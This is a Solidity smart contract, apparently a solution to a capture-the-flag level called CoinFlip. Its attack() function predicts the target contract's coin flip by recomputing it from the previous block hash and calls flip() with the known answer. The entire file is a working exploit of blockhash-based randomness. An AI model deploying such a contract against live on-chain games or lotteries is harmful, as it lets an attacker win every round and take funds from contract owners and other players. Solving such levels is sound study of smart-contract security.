pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
import '../CoinFlip/CoinFlip.sol';

contract AttackCoinFlip {

  using SafeMath for uint256;

  uint256 lastHash;
  CoinFlip public cf;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(address _cf) public {
    cf = CoinFlip(_cf);
  }

  function calculate() public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    return coinFlip == 1 ? true : false;

  }

  function attack() public {
    bool result = calculate();
    cf.flip(result);
  }
}